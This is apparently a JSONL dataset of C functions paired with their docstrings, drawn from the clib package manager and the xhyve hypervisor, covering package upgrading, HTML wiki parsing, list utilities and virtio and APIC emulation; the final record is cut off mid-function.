{"docstring": "/**\n * Entry point.\n */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n  opts.verbose = 1;\n\n  long path_max = 4096;\n\n  debug_init(&debugger, \"clib-upgrade\");\n\n  // 30 days expiration\n  clib_cache_init(CLIB_PACKAGE_CACHE_TIME);\n\n  command_t program;\n\n  command_init(&program, \"clib-upgrade\", CLIB_VERSION);\n\n  program.usage = \"[options] [name ...]\";\n\n  command_option(&program, \"-P\", \"--prefix <dir>\",\n                 \"change the prefix directory (usually '/usr/local')\",\n                 setopt_prefix);\n  command_option(&program, \"-q\", \"--quiet\", \"disable verbose output\",\n                 setopt_quiet);\n  command_option(&program, \"-f\", \"--force\",\n                 \"force the action of something, like overwriting a file\",\n                 setopt_force);\n  command_option(&program, \"-t\", \"--token <token>\",\n                 \"Access token used to read private content\", setopt_token);\n  command_option(&program, \"-S\", \"--slug <slug>\",\n                 \"The slug where the clib project lives (usually 'clibs/clib')\",\n                 setopt_slug);\n  command_option(&program, \"-T\", \"--tag <tag>\",\n                 \"The tag to upgrade to (usually it is the latest)\",\n                 setopt_tag);\n#ifdef HAVE_PTHREADS\n  command_option(&program, \"-C\", \"--concurrency <number>\",\n                 \"Set concurrency (default: \" S(MAX_THREADS) \")\",\n                 setopt_concurrency);\n#endif\n  command_parse(&program, argc, argv);\n\n  debug(&debugger, \"%d arguments\", program.argc);\n\n  if (0 != curl_global_init(CURL_GLOBAL_ALL)) {\n    logger_error(\"error\", \"Failed to initialize cURL\");\n  }\n\n  if (opts.prefix) {\n    char prefix[path_max];\n    memset(prefix, 0, path_max);\n    realpath(opts.prefix, prefix);\n    unsigned long int size = strlen(prefix) + 1;\n    opts.prefix = malloc(size);\n    memset((void *)opts.prefix, 0, size);\n    memcpy((void *)opts.prefix, prefix, size);\n  }\n\n  clib_cache_init(CLIB_PACKAGE_CACHE_TIME);\n\n  package_opts.skip_cache = 1;\n  package_opts.prefix = opts.prefix;\n  package_opts.global = 1;\n  package_opts.force = opts.force;\n  package_opts.token = opts.token;\n\n#ifdef HAVE_PTHREADS\n  package_opts.concurrency = opts.concurrency;\n#endif\n\n  clib_package_set_opts(package_opts);\n\n  char *slug = 0;\n\n  if (0 == opts.tag && 0 != program.argv[0]) {\n    opts.tag = program.argv[0];\n  }\n\n  if (0 == opts.slug) {\n    slug = \"clibs/clib\";\n  } else {\n    slug = opts.slug;\n  }\n\n  int code = install_package(slug);\n\n  curl_global_cleanup();\n  clib_package_cleanup();\n\n  command_free(&program);\n  return code;\n}", "path": "clib/src/clib-upgrade.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "// Returns the current input stream position to the mark.\n", "func_signal": "void utf8iterator_reset(Utf8Iterator* iter)", "code": "{\n  iter->_start = iter->_mark;\n  iter->_pos = iter->_mark_pos;\n  read_char(iter);\n}", "path": "clib/deps/gumbo-parser/utf8.c", "commit_date": "2014-01-03 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Create a new wiki package.\n */\n", "func_signal": "static wiki_package_t *\nwiki_package_new()", "code": "{\n  wiki_package_t *pkg = malloc(sizeof(wiki_package_t));\n  if (pkg) {\n    pkg->repo = NULL;\n    pkg->href = NULL;\n    pkg->description = NULL;\n    pkg->category = NULL;\n  }\n  return pkg;\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Get all elements of `tag_name` contained\n * with the given `root` node.\n */\n", "func_signal": "list_t *\ngumbo_get_elements_by_tag_name(const char *tag_name, GumboNode *root)", "code": "{\n  GumboTag tag;\n  list_t *elements = NULL;\n\n  if (!tag_name || GUMBO_TAG_UNKNOWN == (tag = gumbo_tag_enum(tag_name)))\n    return NULL;\n\n  if (!(elements = list_new()))\n    return NULL;\n\n  crawl(tag, elements, root);\n\n  return elements;\n}", "path": "clib/deps/gumbo-get-elements-by-tag-name/get-elements-by-tag-name.c", "commit_date": "2014-06-29 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Parse a list of packages from the given `html`\n */\n", "func_signal": "list_t *\nwiki_registry_parse(const char *html)", "code": "{\n  GumboOutput *output = gumbo_parse(html);\n  list_t *pkgs = list_new();\n\n  GumboNode *body = gumbo_get_element_by_id(\"wiki-body\", output->root);\n  if (body) {\n    // grab all category `<h2 />`s\n    list_t *h2s = gumbo_get_elements_by_tag_name(\"h2\", body);\n    list_node_t *heading_node;\n    list_iterator_t *heading_iterator = list_iterator_new(h2s, LIST_HEAD);\n    while ((heading_node = list_iterator_next(heading_iterator))) {\n      GumboNode *heading = (GumboNode *) heading_node->val;\n      char *category = gumbo_text_content(heading);\n      // die if we failed to parse a category, as it's\n      // almost certinaly a malloc error\n      if (!category) break;\n      trim(case_lower(category));\n      GumboVector *siblings = &heading->parent->v.element.children;\n      size_t pos = heading->index_within_parent;\n\n      // skip elements until the UL\n      // TODO: don't hardcode position here\n      // 2:\n      //   1 - whitespace\n      //   2 - actual node\n      GumboNode *ul = siblings->data[pos + 2];\n      if (GUMBO_TAG_UL != ul->v.element.tag) {\n        free(category);\n        continue;\n      }\n\n      list_t *lis = gumbo_get_elements_by_tag_name(\"li\", ul);\n      list_iterator_t *li_iterator = list_iterator_new(lis, LIST_HEAD);\n      list_node_t *li_node;\n      while ((li_node = list_iterator_next(li_iterator))) {\n        wiki_package_t *package = parse_li(li_node->val);\n        if (package && package->description) {\n          package->category = strdup(category);\n          list_rpush(pkgs, list_node_new(package));\n        } else {\n          // failed to parse package\n          if (package) wiki_package_free(package);\n        }\n      }\n      list_iterator_destroy(li_iterator);\n      list_destroy(lis);\n      free(category);\n    }\n    list_iterator_destroy(heading_iterator);\n    list_destroy(h2s);\n  }\n\n  gumbo_destroy_output(&kGumboDefaultOptions, output);\n  return pkgs;\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Allocate a new list_iterator_t. NULL on failure.\n * Accepts a direction, which may be LIST_HEAD or LIST_TAIL.\n */\n", "func_signal": "list_iterator_t *\nlist_iterator_new(list_t *list, list_direction_t direction)", "code": "{\n  list_node_t *node = direction == LIST_HEAD\n    ? list->head\n    : list->tail;\n  return list_iterator_new_from_node(node, direction);\n}", "path": "clib/deps/list/list_iterator.c", "commit_date": "2014-06-26 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Add `href` to the given `package`.\n */\n", "func_signal": "static void\nadd_package_href(wiki_package_t *self)", "code": "{\n  size_t len = strlen(self->repo) + 20; // https://github.com/ \\0\n  self->href = malloc(len);\n  if (self->href)\n    sprintf(self->href, \"https://github.com/%s\", self->repo);\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Create and install a package from `slug`.\n */\n", "func_signal": "static int install_package(const char *slug)", "code": "{\n  clib_package_t *pkg = NULL;\n  int rc;\n\n  if (!root_package) {\n    const char *name = NULL;\n    char *json = NULL;\n    unsigned int i = 0;\n\n    do {\n      name = manifest_names[i];\n      json = fs_read(name);\n    } while (NULL != manifest_names[++i] && !json);\n\n    if (json) {\n      root_package = clib_package_new(json, opts.verbose);\n    }\n  }\n\n  char *extended_slug = 0;\n  if (0 != opts.tag) {\n    asprintf(&extended_slug, \"%s@%s\", slug, opts.tag);\n  }\n\n  if (0 != extended_slug) {\n    pkg = clib_package_new_from_slug(extended_slug, opts.verbose);\n  } else {\n    logger_warn(\"warn\",\n                \"In clib 2.6.0, this functionality will change. We will \"\n                \"default to the latest tag rather than the master branch.\")\n        pkg = clib_package_new_from_slug(slug, opts.verbose);\n  }\n\n  if (NULL == pkg) {\n    if (opts.tag) {\n      logger_error(\n          \"error\",\n          \"Unable to install tag %s. Please make sure it actually exists.\",\n          opts.tag);\n    }\n    return -1;\n  }\n\n  if (root_package && root_package->prefix) {\n    package_opts.prefix = root_package->prefix;\n    clib_package_set_opts(package_opts);\n  }\n\n  char *tmp = gettempdir();\n\n  if (0 != tmp) {\n    rc = clib_package_install(pkg, tmp, opts.verbose);\n  } else {\n    rc = -1;\n    goto cleanup;\n  }\n\n  if (0 != rc) {\n    goto cleanup;\n  }\n\n  if (0 == pkg->repo || 0 != strcmp(slug, pkg->repo)) {\n    pkg->repo = strdup(slug);\n  }\n\ncleanup:\n  if (0 != extended_slug) {\n    free(extended_slug);\n  }\n  clib_package_free(pkg);\n  return rc;\n}", "path": "clib/src/clib-upgrade.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Crawl all children of the given `node`,\n * adding `tag` elements to the given `list_t`.\n */\n", "func_signal": "static void\ncrawl(GumboTag tag, list_t *elements, GumboNode *node)", "code": "{\n  NODE_TYPE_CHECK(node);\n\n  if (tag == node->v.element.tag)\n    list_rpush(elements, list_node_new(node));\n\n  GumboVector *children = &node->v.element.children;\n  for (unsigned int i = 0; i < children->length; i++) {\n    crawl(tag, elements, children->data[i]);\n  }\n}", "path": "clib/deps/gumbo-get-elements-by-tag-name/get-elements-by-tag-name.c", "commit_date": "2014-06-29 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Parse the given wiki `li` into a package.\n */\n", "func_signal": "static wiki_package_t *\nparse_li(GumboNode *li)", "code": "{\n  wiki_package_t *self = wiki_package_new();\n  char *text = NULL;\n\n  if (!self) goto cleanup;\n\n  text = gumbo_text_content(li);\n  if (!text) goto cleanup;\n\n  // TODO support unicode dashes\n  char *tok = strstr(text, \" - \");\n  if (!tok) goto cleanup;\n\n  int pos = tok - text;\n  self->repo = substr(text, 0, pos);\n  self->description = substr(text, pos + 3, -1);\n  if (!self->repo || !self->description) goto cleanup;\n  trim(self->description);\n  trim(self->repo);\n\n  add_package_href(self);\n\ncleanup:\n  free(text);\n  return self;\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Get a substring of `str` from `start` to `end`\n */\n", "func_signal": "char *\nsubstr(const char *str, int start, int end)", "code": "{\n  if (0 > start) return NULL;\n  int len = strlen(str);\n  // -1 == length of string\n  if (-1 == end) end = len;\n  if (end <= start) return NULL;\n  int diff = end - start;\n  if (len == diff) return strdup(str);\n  if (len < start) return NULL;\n  if (len + 1 < end) return NULL;\n\n  char *res = malloc(sizeof(char) * diff + 1);\n  if (NULL == res) return NULL;\n  memset(res, '\\0', diff + 1);\n  strncpy(res, str + start, diff);\n  return res;\n}", "path": "clib/deps/substr/substr.c", "commit_date": "2014-06-29 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Free the list iterator.\n */\n", "func_signal": "void\nlist_iterator_destroy(list_iterator_t *self)", "code": "{\n  LIST_FREE(self);\n  self = NULL;\n}", "path": "clib/deps/list/list_iterator.c", "commit_date": "2014-06-26 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Allocate a new list_iterator_t with the given start\n * node. NULL on failure.\n */\n", "func_signal": "list_iterator_t *\nlist_iterator_new_from_node(list_node_t *node, list_direction_t direction)", "code": "{\n  list_iterator_t *self;\n  if (!(self = LIST_MALLOC(sizeof(list_iterator_t))))\n    return NULL;\n  self->next = node;\n  self->direction = direction;\n  return self;\n}", "path": "clib/deps/list/list_iterator.c", "commit_date": "2014-06-26 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Free a wiki_package_t.\n */\n", "func_signal": "void\nwiki_package_free(wiki_package_t *pkg)", "code": "{\n  free(pkg->repo);\n  free(pkg->href);\n  free(pkg->description);\n  free(pkg->category);\n  free(pkg);\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Allocates a new list_node_t. NULL on failure.\n */\n", "func_signal": "list_node_t *\nlist_node_new(void *val)", "code": "{\n  list_node_t *self;\n  if (!(self = LIST_MALLOC(sizeof(list_node_t))))\n    return NULL;\n  self->prev = NULL;\n  self->next = NULL;\n  self->val = val;\n  return self;\n}", "path": "clib/deps/list/list_node.c", "commit_date": "2013-12-29 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "// Adds a decoding error to the parser's error list, based on the current state\n// of the Utf8Iterator.\n", "func_signal": "static void add_error(Utf8Iterator* iter, GumboErrorType type)", "code": "{\n  GumboParser* parser = iter->_parser;\n\n  GumboError* error = gumbo_add_error(parser);\n  if (!error) {\n    return;\n  }\n  error->type = type;\n  error->position = iter->_pos;\n  error->original_text = iter->_start;\n\n  // At the point the error is recorded, the code point hasn't been computed\n  // yet (and can't be, because it's invalid), so we need to build up the raw\n  // hex value from the bytes under the cursor.\n  uint64_t code_point = 0;\n  for (int i = 0; i < iter->_width; ++i) {\n    code_point = (code_point << 8) | (unsigned char) iter->_start[i];\n  }\n  error->v.codepoint = code_point;\n}", "path": "clib/deps/gumbo-parser/utf8.c", "commit_date": "2014-01-03 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Get a `text_nodes_t` instance of all text nodes\n * contained in given `root` node.\n */\n", "func_signal": "static text_nodes_t *\nget_text_nodes(GumboNode *root)", "code": "{\n  text_nodes_t *nodes = malloc(sizeof(text_nodes_t));\n  if (!nodes) return NULL;\n  nodes->length = 0;\n\n  GumboVector *children = &root->v.element.children;\n\n  for (size_t i = 0; i < children->length; i++) {\n    GumboNode *child = children->data[i];\n    if (GUMBO_NODE_TEXT == child->type) {\n      nodes->nodes[nodes->length++] = child->v.text.text;\n    } else if (GUMBO_NODE_ELEMENT == child->type) {\n      text_nodes_t *child_nodes = get_text_nodes(child);\n      // exit loop on malloc failure\n      if (!child_nodes) break;\n      // join children with our node\n      if (child_nodes->length) {\n        for (size_t j = 0; j < child_nodes->length; j++) {\n          nodes->nodes[nodes->length++] = child_nodes->nodes[j];\n        }\n      }\n      free(child_nodes);\n    }\n  }\n  return nodes;\n}", "path": "clib/deps/gumbo-text-content/gumbo-text-content.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/**\n * Get a list of packages from the given GitHub wiki `url`.\n */\n", "func_signal": "list_t *\nwiki_registry(const char *url)", "code": "{\n  http_get_response_t *res = http_get(url);\n  if (!res->ok) return NULL;\n\n  list_t *list = wiki_registry_parse(res->data);\n  http_get_free(res);\n  return list;\n}", "path": "clib/deps/wiki-registry/wiki-registry.c", "commit_date": "2014-10-24 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "// Returns true if this Unicode code point is in the list of characters\n// forbidden by the HTML5 spec, such as undefined control chars.\n", "func_signal": "bool utf8_is_invalid_code_point(int c)", "code": "{\n  return (c >= 0x1 && c <= 0x8) || c == 0xB || (c >= 0xE && c <= 0x1F) ||\n      (c >= 0x7F && c <= 0x9F) || (c >= 0xFDD0 && c <= 0xFDEF) ||\n      ((c & 0xFFFF) == 0xFFFE) || ((c & 0xFFFF) == 0xFFFF);\n}", "path": "clib/deps/gumbo-parser/utf8.c", "commit_date": "2014-01-03 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
{"docstring": "/*\n * Initialize MSI-X vector capabilities if we're to use MSI-X,\n * or MSI capabilities if not.\n *\n * We assume we want one MSI-X vector per queue, here, plus one\n * for the config vec.\n */\n", "func_signal": "int\nvi_intr_init(struct virtio_softc *vs, int barnum, int use_msix)", "code": "{\n\tint nvec;\n\n\tif (use_msix) {\n\t\tvs->vs_flags |= VIRTIO_USE_MSIX;\n\t\tVS_LOCK(vs);\n\t\tvi_reset_dev(vs); /* set all vectors to NO_VECTOR */\n\t\tVS_UNLOCK(vs);\n\t\tnvec = vs->vs_vc->vc_nvq + 1;\n\t\tif (pci_emul_add_msixcap(vs->vs_pi, nvec, barnum))\n\t\t\treturn (1);\n\t} else\n\t\tvs->vs_flags &= ~VIRTIO_USE_MSIX;\n\n\t/* Only 1 MSI vector for bhyve */\n\tpci_emul_add_msicap(vs->vs_pi, 1);\n\n\t/* Legacy interrupts are mandatory for virtio devices */\n\tpci_lintr_request(vs->vs_pi);\n\n\treturn (0);\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Accessors\n */\n", "func_signal": "off_t\nblockif_size(struct blockif_ctxt *bc)", "code": "{\n\tassert(bc->bc_magic == ((int) BLOCKIF_SIG));\n\treturn (bc->bc_size);\n}", "path": "xhyve/src/block_if.c", "commit_date": "2020-11-13 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Returns the current RTC time as number of seconds since 00:00:00 Jan 1, 1970\n */\n", "func_signal": "static time_t\nrtc_time(int use_localtime)", "code": "{\n\tstruct tm tm;\n\ttime_t t;\n\n\ttime(&t);\n\tif (use_localtime) {\n\t\tlocaltime_r(&t, &tm);\n\t\tt = timegm(&tm);\n\t}\n\treturn (t);\n}", "path": "xhyve/src/rtc.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Helper routines for writing to the DSDT from other modules.\n */\n", "func_signal": "void\ndsdt_line(const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tint err;\n\n\terr = 0;\n\n\tif (dsdt_error != 0)\n\t\treturn;\n\n\tif (strcmp(fmt, \"\") != 0) {\n\t\tif (dsdt_indent_level != 0)\n\t\t\tEFPRINTF(dsdt_fp, \"%*c\", dsdt_indent_level * 2, ' ');\n\t\tva_start(ap, fmt);\n\t\tif (vfprintf(dsdt_fp, fmt, ap) < 0)\n\t\t\tgoto err_exit;\n\t\tva_end(ap);\n\t}\n\tEFPRINTF(dsdt_fp, \"\\n\");\n\treturn;\n\nerr_exit:\n\tdsdt_error = errno;\n}", "path": "xhyve/src/acpi.c", "commit_date": "2015-09-24 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Algorithm adopted from section \"Interrupt, Task and Processor Priority\"\n * in Intel Architecture Manual Vol 3a.\n */\n", "func_signal": "static void\nvlapic_update_ppr(struct vlapic *vlapic)", "code": "{\n\tint isrvec, tpr, ppr;\n\n\t/*\n\t * Note that the value on the stack at index 0 is always 0.\n\t *\n\t * This is a placeholder for the value of ISRV when none of the\n\t * bits is set in the ISRx registers.\n\t */\n\tisrvec = vlapic->isrvec_stk[vlapic->isrvec_stk_top];\n\ttpr = (int) vlapic->apic_page->tpr;\n\n#if 1\n\t{\n\t\tint i, lastprio, curprio, vector, idx;\n\t\tuint32_t *isrptr;\n\n\t\tif (vlapic->isrvec_stk_top == 0 && isrvec != 0)\n\t\t\txhyve_abort(\"isrvec_stk is corrupted: %d\\n\", isrvec);\n\n\t\t/*\n\t\t * Make sure that the priority of the nested interrupts is\n\t\t * always increasing.\n\t\t */\n\t\tlastprio = -1;\n\t\tfor (i = 1; i <= vlapic->isrvec_stk_top; i++) {\n\t\t\tcurprio = PRIO(vlapic->isrvec_stk[i]);\n\t\t\tif (curprio <= lastprio) {\n\t\t\t\tdump_isrvec_stk(vlapic);\n\t\t\t\txhyve_abort(\"isrvec_stk does not satisfy invariant\\n\");\n\t\t\t}\n\t\t\tlastprio = curprio;\n\t\t}\n\n\t\t/*\n\t\t * Make sure that each bit set in the ISRx registers has a\n\t\t * corresponding entry on the isrvec stack.\n\t\t */\n\t\ti = 1;\n\t\tisrptr = &vlapic->apic_page->isr0;\n\t\tfor (vector = 0; vector < 256; vector++) {\n\t\t\tidx = (vector / 32) * 4;\n\t\t\tif (isrptr[idx] & (1 << (vector % 32))) {\n\t\t\t\tif (i > vlapic->isrvec_stk_top ||\n\t\t\t\t    vlapic->isrvec_stk[i] != vector) {\n\t\t\t\t\tdump_isrvec_stk(vlapic);\n\t\t\t\t\txhyve_abort(\"ISR and isrvec_stk out of sync\\n\");\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t}\n#endif\n\n\tif (PRIO(tpr) >= PRIO(isrvec))\n\t\tppr = tpr;\n\telse\n\t\tppr = isrvec & 0xf0;\n\n\tvlapic->apic_page->ppr = (uint32_t) ppr;\n\tVLAPIC_CTR1(vlapic, \"vlapic_update_ppr 0x%02x\", ppr);\n}", "path": "xhyve/src/vmm/io/vlapic.c", "commit_date": "2016-08-09 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Handle pci config space writes.\n * If it's to the MSI-X info, do that.\n * If it's part of the virtio standard stuff, do that.\n * Otherwise dispatch to the actual driver.\n */\n", "func_signal": "void\nvi_pci_write(UNUSED int vcpu, struct pci_devinst *pi, int baridx,\n\tuint64_t offset, int size, uint64_t value)", "code": "{\n\tstruct virtio_softc *vs = pi->pi_arg;\n\tstruct vqueue_info *vq;\n\tstruct virtio_consts *vc;\n\tstruct config_reg *cr;\n\tuint64_t virtio_config_size, max;\n\tconst char *name;\n\tuint32_t newoff;\n\tint error;\n\n\tif (vs->vs_flags & VIRTIO_USE_MSIX) {\n\t\tif (baridx == pci_msix_table_bar(pi) ||\n\t\t    baridx == pci_msix_pba_bar(pi)) {\n\t\t\tpci_emul_msix_twrite(pi, offset, size, value);\n\t\t\treturn;\n\t\t}\n\t}\n\n\t/* XXX probably should do something better than just assert() */\n\tassert(baridx == 0);\n\n\tif (vs->vs_mtx)\n\t\tpthread_mutex_lock(vs->vs_mtx);\n\n\tvc = vs->vs_vc;\n\tname = vc->vc_name;\n\n\tif (size != 1 && size != 2 && size != 4)\n\t\tgoto bad;\n\n\tif (pci_msix_enabled(pi))\n\t\tvirtio_config_size = VTCFG_R_CFG1;\n\telse\n\t\tvirtio_config_size = VTCFG_R_CFG0;\n\n\tif (offset >= virtio_config_size) {\n\t\t/*\n\t\t * Subtract off the standard size (including MSI-X\n\t\t * registers if enabled) and dispatch to underlying driver.\n\t\t */\n\t\tnewoff = (uint32_t) (offset - virtio_config_size);\n\t\tmax = vc->vc_cfgsize ? vc->vc_cfgsize : 0x100000000;\n\t\tif ((newoff + ((unsigned) size)) > max)\n\t\t\tgoto bad;\n\t\terror = (*vc->vc_cfgwrite)(DEV_SOFTC(vs), ((int) newoff), size,\n\t\t\t((uint32_t) value));\n\t\tif (!error)\n\t\t\tgoto done;\n\t}\n\nbad:\n\tcr = vi_find_cr((int) offset);\n\tif (cr == NULL || cr->cr_size != size || cr->cr_ro) {\n\t\tif (cr != NULL) {\n\t\t\t/* offset must be OK, wrong size and/or reg is R/O */\n\t\t\tif (cr->cr_size != size)\n\t\t\t\tfprintf(stderr,\n\t\t\t\t    \"%s: write to %s: bad size %d\\r\\n\",\n\t\t\t\t    name, cr->cr_name, size);\n\t\t\tif (cr->cr_ro)\n\t\t\t\tfprintf(stderr,\n\t\t\t\t    \"%s: write to read-only reg %s\\r\\n\",\n\t\t\t\t    name, cr->cr_name);\n\t\t} else {\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: write to bad offset/size %jd/%d\\r\\n\",\n\t\t\t    name, (uintmax_t)offset, size);\n\t\t}\n\t\tgoto done;\n\t}\n\n\tswitch (offset) {\n\tcase VTCFG_R_GUESTCAP:\n\t\tvs->vs_negotiated_caps = (uint32_t) (value & vc->vc_hv_caps);\n\t\tif (vc->vc_apply_features)\n\t\t\t(*vc->vc_apply_features)(DEV_SOFTC(vs),\n\t\t\t    vs->vs_negotiated_caps);\n\t\tbreak;\n\tcase VTCFG_R_PFN:\n\t\tif (vs->vs_curq >= vc->vc_nvq)\n\t\t\tgoto bad_qindex;\n\t\tvi_vq_init(vs, ((uint32_t) value));\n\t\tbreak;\n\tcase VTCFG_R_QSEL:\n\t\t/*\n\t\t * Note that the guest is allowed to select an\n\t\t * invalid queue; we just need to return a QNUM\n\t\t * of 0 while the bad queue is selected.\n\t\t */\n\t\tvs->vs_curq = (int) value;\n\t\tbreak;\n\tcase VTCFG_R_QNOTIFY:\n\t\tif (value >= ((uint64_t) vc->vc_nvq)) {\n\t\t\tfprintf(stderr, \"%s: queue %d notify out of range\\r\\n\",\n\t\t\t\tname, (int)value);\n\t\t\tgoto done;\n\t\t}\n\t\tvq = &vs->vs_queues[value];\n\t\tif (vq->vq_notify)\n\t\t\t(*vq->vq_notify)(DEV_SOFTC(vs), vq);\n\t\telse if (vc->vc_qnotify)\n\t\t\t(*vc->vc_qnotify)(DEV_SOFTC(vs), vq);\n\t\telse\n\t\t\tfprintf(stderr,\n\t\t\t    \"%s: qnotify queue %d: missing vq/vc notify\\r\\n\",\n\t\t\t\tname, (int)value);\n\t\tbreak;\n\tcase VTCFG_R_STATUS:\n\t\tvs->vs_status = (uint8_t) value;\n\t\tif (value == 0)\n\t\t\t(*vc->vc_reset)(DEV_SOFTC(vs));\n\t\tbreak;\n\tcase VTCFG_R_CFGVEC:\n\t\tvs->vs_msix_cfg_idx = (uint16_t) value;\n\t\tbreak;\n\tcase VTCFG_R_QVEC:\n\t\tif (vs->vs_curq >= vc->vc_nvq)\n\t\t\tgoto bad_qindex;\n\t\tvq = &vs->vs_queues[vs->vs_curq];\n\t\tvq->vq_msix_idx = (uint16_t) value;\n\t\tbreak;\n\t}\n\tgoto done;\n\nbad_qindex:\n\tfprintf(stderr,\n\t    \"%s: write config reg %s: curq %d >= max %d\\r\\n\",\n\t    name, cr->cr_name, vs->vs_curq, vc->vc_nvq);\ndone:\n\tif (vs->vs_mtx)\n\t\tpthread_mutex_unlock(vs->vs_mtx);\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Console i/o callbacks\n */\n", "func_signal": "static void\ncb_putc(UNUSED void *arg, int ch)", "code": "{\n\tchar c = (char) ch;\n\n\t(void) write(consout_fd, &c, 1);\n}", "path": "xhyve/src/firmware/fbsd.c", "commit_date": "2019-09-17 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Initialize the currently-selected virtio queue (vs->vs_curq).\n * The guest just gave us a page frame number, from which we can\n * calculate the addresses of the queue.\n */\n", "func_signal": "static void\nvi_vq_init(struct virtio_softc *vs, uint32_t pfn)", "code": "{\n\tstruct vqueue_info *vq;\n\tuint64_t phys;\n\tsize_t size;\n\tchar *base;\n\n\tvq = &vs->vs_queues[vs->vs_curq];\n\tvq->vq_pfn = pfn;\n\tphys = (uint64_t)pfn << VRING_PFN;\n\tsize = vring_size(vq->vq_qsize);\n\tbase = paddr_guest2host(phys, size);\n\n\t/* First page(s) are descriptors... */\n\tvq->vq_desc = (struct virtio_desc *)base;\n\tbase += vq->vq_qsize * sizeof(struct virtio_desc);\n\n\t/* ... immediately followed by \"avail\" ring (entirely uint16_t's) */\n\tvq->vq_avail = (struct vring_avail *)base;\n\tbase += (2 + vq->vq_qsize + 1) * sizeof(uint16_t);\n\n\t/* Then it's rounded up to the next page... */\n\tbase = (char *) roundup2(((uintptr_t) base), ((uintptr_t) VRING_ALIGN));\n\n\t/* ... and the last page(s) are the used ring. */\n\tvq->vq_used = (struct vring_used *)base;\n\n\t/* Mark queue as allocated, and start at 0 when we use it. */\n\tvq->vq_flags = VQ_ALLOC;\n\tvq->vq_last_avail = 0;\n\tvq->vq_save_used = 0;\n}", "path": "xhyve/src/virtio.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "machyve/xhyve", "stars": 6416, "license": "other", "language": "c", "size": 11965}
{"docstring": "/*\n * Driver has finished processing \"available\" chains and calling\n * vq_relchain on each one.  If driver used all the available\n * chains, used_all should be set.\n *\n * If the \"used\" index moved we may need to inform the guest, i.e.,\n * deliver an interrupt.  Even if the used index did NOT move we\n * may need to deliver an interrupt, if the avail ring is empty and\n * we are supposed to interrupt on empty.\n *\n * Note that used_all_avail is provided by the caller because it's\n * a snapshot of the ring state when he decided to finish interrupt\n * processing -- it's possible that descriptors became available after\n * that point.  (It's also typically a constant 1/True as well.)\n */\n", "func_signal": "void\nvq_endchains(struct vqueue_info *vq, int used_all_avail)", "code": "{\n\tstruct virtio_softc *vs;\n\tuint16_t event_idx, new_idx, old_idx;\n\tint intr;\n\n\t/*\n\t * Interrupt generation: if we're using EVENT_IDX,\n\t * interrupt if we've crossed the event threshold.\n\t * Otherwise interrupt is generated if we added \"used\" entries,\n\t * but suppressed by VRING_AVAIL_F_NO_INTERRUPT.\n\t *\n\t * In any case, though, if NOTIFY_ON_EMPTY is set and the\n\t * entire avail was processed, we need to interrupt always.\n\t */\n\tvs 